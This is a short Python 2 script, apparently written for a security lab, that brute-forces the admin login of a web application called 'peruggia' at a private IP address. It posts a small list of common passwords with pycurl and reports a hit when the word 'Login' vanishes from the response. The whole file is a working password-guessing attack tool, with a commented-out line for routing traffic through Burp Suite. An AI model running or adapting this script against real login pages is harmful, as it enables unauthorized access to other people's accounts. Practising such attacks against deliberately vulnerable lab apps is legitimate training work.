import pycurl                   # used to execute curl in python
import urllib                   # used to format parameters into a http url
import StringIO                 # library used to store curl results\
from bs4 import BeautifulSoup   # library for parsing html content

#http://www.angryobjects.com/2011/10/15/http-with-python-pycurl-by-example/
passwords = ['test','1234','4321','admin','badmin']

for password in passwords:

    c = pycurl.Curl()                                                               # curl object
    url = 'http://10.254.10.164/peruggia/index.php?action=login&check=1'            # url we are calling 
    params = urllib.urlencode({'username':'admin','password':password })            # set id to 1

    c.setopt(c.POSTFIELDS, params)                                  #
    c.setopt(c.URL, url)                                            # set url n curl object
    c.setopt(c.CONNECTTIMEOUT, 5)                                   # set time call timeout to 5 secounds
    c.setopt(pycurl.FOLLOWLOCATION, 1)                              # if we get a location header response follow it.
    c.setopt(c.TIMEOUT, 8)                                          # maximum amount of seconds curl is allowed to run
    c.setopt(c.COOKIEFILE, '')                                      # the file to sotre the cookie data 
    #c.setopt(c.VERBOSE, True)                                      # dislay http calls in terminal
    c.setopt(pycurl.COOKIEJAR, 'cookie.txt')                        # cookie file to store website cookie data
    b = StringIO.StringIO()                                         # String io object

    #c.setopt(c.PROXY, 'http://127.0.0.1:8080')                     #debug calls in burpsuite
    c.setopt(c.HTTPHEADER, ['Accept: application/html', 'Content-Type: application/x-www-form-urlencoded'])
    c.setopt(pycurl.WRITEFUNCTION, b.write)


    try:
        c.perform()                      # run pycurl
        html_doc = b.getvalue()          # get html from StrinIO                       
        soup = BeautifulSoup(html_doc)   # parse html
        text = soup.get_text()           # get website a pure test

        #print '------------------ ' + "\n"
        #print text
        #print '------------------ ' + "\n"

        if text.find('Login') == -1:
            print "found password : " + password +"\n"
        else:
            print "password is not : " + password +"\n"


    except pycurl.error, error:
        errno, errstr = error
        print 'An error occurred: ', errstr
